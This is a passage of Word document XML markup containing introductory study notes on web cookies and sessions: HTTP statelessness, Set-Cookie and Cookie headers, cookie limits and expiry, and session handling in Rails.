                <w:color w:val="4A5458"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="lightGray"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C55750">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="4A5458"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="lightGray"/>
              </w:rPr>
              <w:t>Role of session and cookie</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00C55750" w:rsidRPr="00C55750" w:rsidRDefault="00C55750" w:rsidP="00C55750">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="4A5458"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="lightGray"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C55750">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="4A5458"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="lightGray"/>
              </w:rPr>
              <w:t>When use cookie and session</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00C55750" w:rsidRPr="00C55750" w:rsidRDefault="00C55750" w:rsidP="00C55750">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="4A5458"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C55750">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="4A5458"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="lightGray"/>
              </w:rPr>
              <w:t>How to test cookie and session</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00C55750" w:rsidRDefault="00C55750" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00C55750" w:rsidRPr="00E97930" w:rsidRDefault="00C55750" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="001D67EA" w:rsidRPr="00242793" w:rsidRDefault="00242793" w:rsidP="002D1079">
            <w:pPr>
              <w:textAlignment w:val="baseline"/>
              <w:rPr>
                <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
                <w:b/>
                <w:color w:val="242729"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00242793">
              <w:rPr>
                <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
                <w:b/>
                <w:color w:val="242729"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Cookie and Session:</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p w:rsidR="001D67EA" w:rsidRDefault="001D67EA" w:rsidP="002D1079">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:textAlignment w:val="baseline"/>
              <w:rPr>
                <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
                <w:color w:val="242729"/>
                <w:sz w:val="23"/>
                <w:szCs w:val="23"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00D64429" w:rsidRDefault="00D64429" w:rsidP="00D64429">
      <w:pPr>
        <w:pStyle w:val="qtextpara"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C347E7">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:b/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Sessions</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> - are created &amp; managed by the web server (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>,.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> Apache) - and these sessions are used to identify and manage valid User Sessions (HTTP is stateless by nature!).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D64429" w:rsidRDefault="00D64429" w:rsidP="00D64429">
      <w:pPr>
        <w:pStyle w:val="qtextpara"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">Once you login to any web application, and the given credentials (user id and password) are validated by the application, the associated Web Server starts a unique session exclusively for you. And this is how </w:t>
      </w:r>
      <w:r w:rsidRPr="00D74E62">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:b/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D74E62">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:b/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>keeps recognizing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>your</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> one after another HTTP requests you send to the web server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D64429" w:rsidRDefault="00D64429" w:rsidP="00D64429">
      <w:pPr>
        <w:pStyle w:val="qtextpara"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Finally, either the Sessions are timed-out after a pre-set duration (e.g. 30 minutes) or they are programmed to expire - after a certain period of activities or eventually an active session is terminated once you explicitly logout.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D64429" w:rsidRDefault="00D64429" w:rsidP="00D64429">
      <w:pPr>
        <w:pStyle w:val="qtextpara"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C347E7">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:b/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> are something - that </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> sent by the </w:t>
      </w:r>
      <w:r w:rsidRPr="002D7020">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:b/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>web servers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> to browsers (aka clients) and usually these cookies resides on the client machines (computers) - for the specified period of time (until it expires). They comprise of small set data / files</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D64429" w:rsidRDefault="00D64429" w:rsidP="00D64429">
      <w:pPr>
        <w:pStyle w:val="qtextpara"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>The cookies are used for various purposes. One of most common usage is to monitor the pattern of user’s (client’s) activity on a website (who has sent the cookie)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D64429" w:rsidRDefault="00D64429" w:rsidP="00D64429">
      <w:pPr>
        <w:pStyle w:val="qtextpara"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">Like sessions, cookies can also be programmed to expire after </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>a certain</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> duration or under certain circumstances.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D64429" w:rsidRDefault="00D64429" w:rsidP="00D64429">
      <w:pPr>
        <w:pStyle w:val="qtextpara"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>All the server side programming languages e.g. PHP provides the infrastructure to manage the life cycle of cookies and sessions.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB60F2" w:rsidRDefault="00AB60F2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00AB5160">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="150" w:after="150"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="722B00"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="722B00"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Cookies and Sessions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00AB5160">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="722B00"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="722B00"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Stateless applications</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Web application servers are generally "stateless":</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Each HTTP request is independent; server can't tell if 2 requests came from the same browser or user.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Web server applications maintain no information in memory from request to request (only information on disk survives from one request to another).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Statelessness not always convenient for application developers: need to tie together a series of requests from the same user.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00AB5160">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="722B00"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="722B00"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Browser cookies</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>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Cookie basics:</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The first time a browser connects with a particular server, there are no cookies.</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When the server responds it includes a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Set-Cookie:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t> header that defines a cookie.</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Each cookie is just a name-value pair.</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In the future whenever the browser connects with the same server, it includes a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Cookie:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t> header containing the name and value, which the server can use to connect related requests.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>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What's in a cookie?</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Name and data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="2"/>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Data size limited by browsers (typically &lt; 4 KB).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="2"/>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A server can define multiple cookies with different names, but browsers limit the number of cookies per server (around 50).</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Domain for this cookie: server, port (optional), URL prefix (optional). The cookie is only included in requests matching its domain.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="75"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Expiration date: browser can delete old cookies.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00AB5160">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="722B00"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="722B00"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Sessions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>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Cookies are used by the server to implement </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>sessions</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>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A pool of data related to an active connection (one browser instance).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRPr="0049437B" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="76"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Typically the </w:t>
      </w:r>
      <w:r w:rsidRPr="0049437B">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>cookie for an application contains an identifier for a session.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>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Web frameworks like Rails do most of the work of managing sessions and cookies:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>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Rails provides </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="code"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>, a hash-like object in which you can store anything you like</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="2"/>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Data will be available in all future requests from the same browser.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>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Rails automatically checks for a session cookie at the start of each request:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="2"/>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Cookie exists? use it to find session data</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="2"/>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No cookie? Create new session, new cookie</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="76"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>End of each request: save session data where it can be found by future requests.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>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Managing session state:</w:t>
      </w:r>
    </w:p>
